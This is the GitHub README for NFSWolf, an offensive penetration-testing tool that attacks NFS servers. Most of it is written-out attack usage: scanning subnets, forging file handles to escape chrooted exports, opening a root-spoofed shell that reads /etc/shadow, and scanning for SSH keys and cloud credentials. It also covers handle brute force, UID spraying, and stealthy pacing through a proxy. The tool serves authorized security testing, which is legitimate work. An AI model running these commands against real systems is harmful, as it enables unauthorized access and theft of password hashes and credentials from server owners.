<h1 align="center">NFSWolf</h1>

<p align="center">
  <strong>Find NFS shares. Escape export boundaries. Read /etc/shadow. One static binary.</strong>
</p>

<p align="center">
  <a href="https://github.com/StrongWind1/NFSWolf/actions/workflows/ci.yml"><img src="https://github.com/StrongWind1/NFSWolf/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <a href="https://crates.io/crates/nfswolf"><img src="https://img.shields.io/crates/v/nfswolf.svg" alt="crates.io"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License: Apache 2.0"></a>
  <a href="https://strongwind.dev/NFSWolf/"><img src="https://img.shields.io/badge/docs-mkdocs-blue.svg" alt="Docs"></a>
</p>

<p align="center">
  <a href="#installation">Installation</a> &bull;
  <a href="#quick-start">Quick start</a> &bull;
  <a href="#subcommands">Subcommands</a> &bull;
  <a href="https://strongwind.dev/NFSWolf/security/">Findings catalog</a> &bull;
  <a href="https://strongwind.dev/NFSWolf/">Documentation</a>
</p>

---

NFSWolf covers the full NFS attack path in a single binary: scan a network for NFS, audit every export against 62 documented security findings, escape chrooted exports to the full filesystem across 18 filesystem types, drop into an interactive shell with automatic credential escalation, or FUSE-mount the export locally. Pure Rust, no `libnfs`, statically linked under musl. Replaces `showmount`, `nfsshell`, `nfsspy`, and the Metasploit NFS modules.

## From scan to /etc/shadow in three commands

```console
$ nfswolf scan 192.168.1.0/24
╭──────────────┬──────┬───────────┬───────┬───────────╮
│ IP           │ NFSv3│ v3 Exports│ NFSv4 │ v4 Exports│
├──────────────┼──────┼───────────┼───────┼───────────┤
│ 192.168.1.10 │ yes  │ 2         │ yes   │ 2         │
│ 192.168.1.22 │ yes  │ 1         │ --    │ --        │
╰──────────────┴──────┴───────────┴───────┴───────────╯
[*] Done in 3.2s -- 254 host(s) scanned, 2 with NFS

$ nfswolf escape --fast 192.168.1.10:/srv/nfs
[*] Escaping 192.168.1.10 (fast mode)
[*] 1 unique seed handle(s) acquired
[*] 3 candidates constructed (deduped from 5)
[*] 1 tree-top(s) confirmed

  Results:
    [OS-ESCAPE]  ext4 inode 2  via MOUNT v3 /srv/nfs   [v3]  no_root_squash,rw
         handle: 0100070001000200000000000000000000000002ffffffff
         likely the real filesystem root, best candidate to try first
         rootfs dirs: bin, etc, usr, var (score: 4)

  1 handle(s) found from 1 seeds. 1 confirmed server rootfs.

  Next steps: Copy the handle above and use it with:
    nfswolf shell 192.168.1.10 --handle 0100070001000200000000000000000000000002ffffffff
    nfswolf mount 192.168.1.10 /mnt/escape --handle 0100070001000200000000000000000000000002ffffffff

$ nfswolf shell 192.168.1.10 \
    --handle 0100070001000200000000000000000000000002ffffffff --uid 0
nfswolf@192.168.1.10:/ uid=0 gid=0> cat /etc/shadow
root:$y$j9T$8kQx...:19874:0:99999:7:::
daemon:*:19874:0:99999:7:::

nfswolf@192.168.1.10:/ uid=0 gid=0> suid-scan /
[*] scanning for SUID/SGID binaries...
[!] SUID 4755  uid=0  /usr/bin/sudo
[!] SUID 4755  uid=0  /usr/bin/passwd
[!] SUID 4755  uid=0  /usr/bin/pkexec

nfswolf@192.168.1.10:/ uid=0 gid=0> secrets-scan /home
[*] scanning for secrets and credentials...
[!] potential secret: /home/admin/.ssh/id_rsa  (1675 bytes  0600)
[!] potential secret: /home/admin/.aws/credentials  (234 bytes  0600)
[!] potential secret: /home/deploy/.env  (512 bytes  0644)
```

The export was chrooted to `/srv/nfs`. NFSWolf constructed a file handle pointing at inode 2 (the ext4 filesystem root), bypassing the export boundary entirely. From there, the full filesystem is accessible -- `/etc/shadow`, suid binaries, SSH keys, everything.

## Installation

```sh
# Prebuilt static binary (Linux x86_64, zero dependencies):
curl -LO https://github.com/StrongWind1/NFSWolf/releases/latest/download/nfswolf-linux-x86_64
chmod +x nfswolf-linux-x86_64

# Or from crates.io:
cargo install nfswolf

# Or from source:
git clone https://github.com/StrongWind1/NFSWolf && cd NFSWolf && make release
```

<details>
<summary><strong>All artifacts and verification</strong></summary>

Download from the [Releases page](https://github.com/StrongWind1/NFSWolf/releases). Each release ships with a `SHA256SUMS` checksum file, a `SHA256SUMS.sig` cosign signature, and per-artifact SLSA build-provenance attestations.

**Pick your artifact carefully** -- the `mount` subcommand is NOT in the musl static build:

| File | Link | FUSE / `nfswolf mount` | When to use it |
|---|---|:---:|---|
| `nfswolf-linux-x86_64` | musl, static | **no** | Zero-dependency binary, runs on any Linux kernel (Alpine, distroless, CI runners) |
| `nfswolf-linux-x86_64-full` | glibc, dynamic | **yes** | `nfswolf mount` (FUSE). Requires libfuse3 on the host |
| `nfswolf-linux-arm64`, `-arm64-full` | same split on ARM64 | same split | Same trade-off on ARM64 |
| `nfswolf-macos-universal`, `-arm64`, `-x86_64` | macOS | macFUSE required | Install [macFUSE](https://osxfuse.github.io/) separately for `mount` |
| `nfswolf-windows-x86_64-msvc.exe`, `-gnu.exe`, `-arm64-msvc.exe` | Windows | **no** | FUSE is Linux / macOS only |

```sh
# Integrity:
sha256sum -c SHA256SUMS --ignore-missing

# Authenticity (cosign):
cosign verify-blob \
  --certificate-identity-regexp "^https://github\\.com/StrongWind1/NFSWolf/" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  --signature SHA256SUMS.sig \
  SHA256SUMS
```

</details>

## What it does

- **Escapes export boundaries** -- constructs file handles that bypass `subtree_check` on 18 filesystem types (ext2/3/4, XFS, BTRFS, ZFS, f2fs, JFS, NILFS2, ReiserFS, VFAT, NTFS3, UDF, bcachefs, SquashFS, EROFS, ISO9660), reaching the full filesystem root from a chrooted export. Cascades through MOUNT v3, v1, NFSv4 LOOKUP, and LOOKUPP.
- **Escalates credentials automatically** -- when access is denied, an evidence-driven UID ladder tries the file owner, the caller's UID with the file's group, root, identities observed in directory listings, and common service accounts. No manual UID guessing.
- **Audits 62 security findings** -- export misconfigurations, credential weaknesses, handle leaks, privilege escalation paths, and protocol downgrades. Each finding references its RFC section and includes severity, detection method, and remediation. Full catalog on the [docs site](https://strongwind.dev/NFSWolf/security/).
- **Interactive shell** -- 47 commands across NFSv2, NFSv3, and NFSv4 with tab completion, recursive `get -r`/`put -r` with SHA-256 verification, `--handle` for MOUNT bypass, `-c` for scripting, `suid-scan`, `secrets-scan`, `last`/`lastb`/`lastlog` for login history, and auto-version detection.
- **FUSE mount** -- mount any NFS export locally with spoofed credentials, per-inode credential escalation, and symlink rewriting on escaped roots. NFSv2, v3, and v4.
- **Brute-forces handles** -- inode/generation cross-product sweep with STALE/BADHANDLE oracle discrimination and `--mask` nibble-mask mode for OS-agnostic file handle brute force.
- **Zero dependencies** -- pure Rust, no `libnfs`, no C. Static musl binary runs on any Linux. Also builds for macOS and Windows.

<details>
<summary><strong>Protocol and engine details</strong></summary>

- **Protocols**: NFSv2 (RFC 1094), NFSv3 (RFC 1813), NFSv4.0 (RFC 7530) over TCP. MOUNT v1/v3, portmapper v2, rpcbind v3/v4. NFS_ACL (program 100227) for POSIX ACL enumeration, RQUOTA (program 100011) for UID existence oracle. UDP for portmapper probes.
- **Auth**: AUTH_SYS with per-call stamp rotation, AUTH_DH cryptographic sessions (RFC 2695, optional `auth-dh` feature), AUTH_SHORT credential replay from server verifiers.
- **RPC engine**: connection-pooled per (host, export, uid, gid) with LIFO reuse, circuit breaker (sliding window, exponential cooldown -- only transient errors trip it, never permission denials), per-call timeouts, stealth delay + jitter pacing.
- **Handle oracle**: STALE = right format, wrong inode/generation (the handle space is warm). BADHANDLE = wrong format entirely (cold). This distinction guides brute-force strategy.
- **Network**: SOCKS5 proxy for all TCP, privileged source port binding (`--privileged-port`), IPv6.
- **Reports**: HTML (self-contained), JSON, CSV, Markdown, plain-text, ANSI console. Offline conversion between formats via `nfswolf convert`.

</details>

## Quick start

```sh
# Scan a subnet for NFS:
nfswolf scan 192.168.1.0/24

# Security audit with HTML report:
nfswolf analyze --json 192.168.1.10 > results.json
nfswolf convert -i results.json -f html -o report.html

# Escape an export to the filesystem root:
nfswolf escape --fast 192.168.1.10:/srv/nfs

# Full escape -- all exports, all handle sources, all versions:
nfswolf escape 192.168.1.10 --json --read-shadow > escape.json

# Interactive shell (auto-detects NFSv2/v3/v4):
nfswolf shell 192.168.1.10:/srv/nfs --uid 0

# Shell with a pre-obtained handle (skips MOUNT entirely):
nfswolf shell 192.168.1.10 --handle DEADBEEF...

# Script mode:
nfswolf shell 192.168.1.10:/srv/nfs --uid 0 -c "cat /etc/shadow"

# Mount an export locally via FUSE:
sudo nfswolf --uid 0 mount 192.168.1.10:/srv/nfs /mnt/target

# Decode a file handle offline:
nfswolf decode 0100070216002a00...

# Brute-force handles with nibble mask:
nfswolf brute-handle 192.168.1.10:/srv/nfs --mask "01000700????????00000000000000000000000200000000"

# Stealth: 200ms delay + 50ms jitter between RPCs, through a SOCKS5 proxy:
nfswolf analyze 192.168.1.10 --delay 200 --jitter 50 --proxy 127.0.0.1:1080
```

## Subcommands

| Group | Subcommand | Purpose |
|---|---|---|
| Recon | `scan` | Network-wide NFS discovery (CIDR, target file, single host) |
| Recon | `analyze` | Per-host security audit against the 62-finding catalog |
| Recon | `escape` | Export escape across 18 filesystem types. `--fast` for single-export, `--all` for every handle source. `--json`, `--read-shadow`, `--all-handles` |
| Connect | `shell` | Interactive REPL with 47 commands. Auto-detects NFSv2/v3/v4. `--handle` for MOUNT bypass, `-c` for scripting |
| Connect | `mount` | FUSE mount with spoofed credentials (glibc build only) |
| Advanced | `brute-handle` | Handle brute-force with STALE/BADHANDLE oracle. `--mask` nibble-mask mode |
| Advanced | `uid-spray` | Last-resort UID/GID brute force |
| Utilities | `convert` | Render analysis results to HTML / JSON / CSV / Markdown / text / console |
| Utilities | `decode` | Offline file handle decoder with OS/FS fingerprint and security assessment |
| Utilities | `completions` | Shell completions for bash, zsh, fish, PowerShell |

<details>
<summary><strong>Global flags</strong></summary>

```
--uid <UID>              AUTH_SYS UID (default 1000; use 0 for root spoof)
--gid <GID>              AUTH_SYS primary GID (default 1000)
--aux-gids <G1,G2,...>   Auxiliary GIDs (max 16 per RFC 1057 sec. 9.2)
--hostname <NAME>        AUTH_SYS machinename field
--privileged-port        Bind source port <1024 (may require CAP_NET_BIND_SERVICE / root)
--proxy <HOST:PORT>      Route all RPC through SOCKS5 (no-auth) proxy
--nfs-port <PORT>        Override NFS service port (default: portmapper lookup)
--mount-port <PORT>      Override mountd port (default: portmapper lookup)
--rpc-port <PORT>        Override portmapper/rpcbind port (default: 111)
--skip-rpc               Skip portmapper probes (use when port 111 is firewalled)
--skip-mountd            Skip MOUNT daemon queries (NFSv4 pseudo-FS still runs)
--timeout <MS>           Per-RPC timeout in milliseconds (default 3000)
--delay <MS>             Baseline inter-RPC delay (stealth pacing)
--jitter <MS>            Random jitter added to each delay
--no-color               Strip ANSI colors
-q / --quiet             Suppress status banners and rerun hints
-v / -vv / -vvv          Verbosity (info / debug / trace)
```

</details>

## What NFSWolf does not do

- Does not exploit RPCSEC_GSS / Kerberized mounts (detection only).
- Does not attack NFS-over-TLS channels (detects `NONE`/`TLS_V1` negotiation only).
- Does not modify server state without `--allow-write`.
- Does not run without an authorized target specified on the command line.

## Platform support

| Platform | Scan / Analyze / Escape / Shell | `mount` (FUSE) |
|---|:---:|:---:|
| Linux x86_64 (glibc) | yes | yes |
| Linux x86_64 (musl static) | yes | no |
| Linux arm64 | yes | yes |
| macOS (Apple Silicon & Intel) | yes | macFUSE req. |
| Windows x86_64 / arm64 | yes | no |

<details>
<summary><strong>Protocol crates</strong></summary>

The NFS protocol stack is split into eight standalone crates, published on [crates.io](https://crates.io) and usable independently of the `nfswolf` binary:

| Crate | Description |
|---|---|
| [`onc-xdr-derive`](https://crates.io/crates/onc-xdr-derive) | `#[derive(XdrCodec)]` proc macro for XDR (RFC 4506) |
| [`onc-xdr`](https://crates.io/crates/onc-xdr) | XDR codec: `Pack`/`Unpack` traits, opaque data, length-hardened decoders |
| [`onc-rpc-client`](https://crates.io/crates/onc-rpc-client) | ONC RPC v2 (RFC 5531) client with AUTH_SYS, AUTH_DH (RFC 2695), AUTH_SHORT, and async transport |
| [`onc-rpcbind`](https://crates.io/crates/onc-rpcbind) | Portmapper v2 (RFC 1057) and rpcbind v3/v4 (RFC 1833) |
| [`nfs-mount`](https://crates.io/crates/nfs-mount) | MOUNT v1/v3 (RFC 1094 / RFC 1813) |
| [`nfs-v2`](https://crates.io/crates/nfs-v2) | NFSv2 (RFC 1094): all 18 procedures |
| [`nfs-v3`](https://crates.io/crates/nfs-v3) | NFSv3 (RFC 1813): all 22 procedures + domain types |
| [`nfs-v4`](https://crates.io/crates/nfs-v4) | NFSv4.0 (RFC 7530): all 37 ops, 66 status codes, stateful client, 45 public methods |

</details>

<details>
<summary><strong>Development</strong></summary>

Conventional commit messages (`feat:`, `fix:`, `docs:`). 808 tests across 8 workspace crates and the binary.

```sh
make hooks        # install the repo pre-commit hook
make dev          # debug build, fast iteration
make check-all    # full gate: fmt, lint, audit, check, test, doc, hygiene
```

</details>

## Credits

- [nfs3-rs](https://github.com/Vaiz/nfs3) by Vaiz -- the NFSv3 / MOUNT / portmapper / XDR foundation, released under the Unlicense.
- Authors of RFC 1057, RFC 1094, RFC 1813, RFC 5531, RFC 7530, RFC 2623, RFC 9289.

## Related tools

- [PassWolf](https://github.com/StrongWind1/PassWolf) -- AD password change, reset, and policy read over SAMR, Netlogon, LSA, Kerberos, and LDAP
- [CredWolf](https://github.com/StrongWind1/CredWolf) -- Active Directory credential validation over NTLM and Kerberos
- [KerbWolf](https://github.com/StrongWind1/KerbWolf) -- Kerberos roasting and hash extraction toolkit
- [NTDSWolf](https://github.com/StrongWind1/NTDSWolf) -- offline NTDS.dit parser and credential extractor
- [AD-SecretGen](https://github.com/StrongWind1/AD-SecretGen) -- derive AD password hashes and Kerberos keys from a cleartext password
- [WPAWolf](https://github.com/StrongWind1/WPAWolf) -- WPA/WPA2/WPA3-FT-PSK handshake extraction from captures
- [WEPWolf](https://github.com/StrongWind1/WEPWolf) -- offline WEP key recovery from 802.11 captures

## Disclaimer

NFSWolf is a penetration-testing and security-research tool. Operating it against systems without explicit written authorization is illegal in most jurisdictions. You alone are responsible for how you use it.

If you believe you have found a security issue in NFSWolf itself, please open a private security advisory on the [GitHub repository](https://github.com/StrongWind1/NFSWolf/security/advisories) rather than a public issue.

## License

[Apache License 2.0](LICENSE)
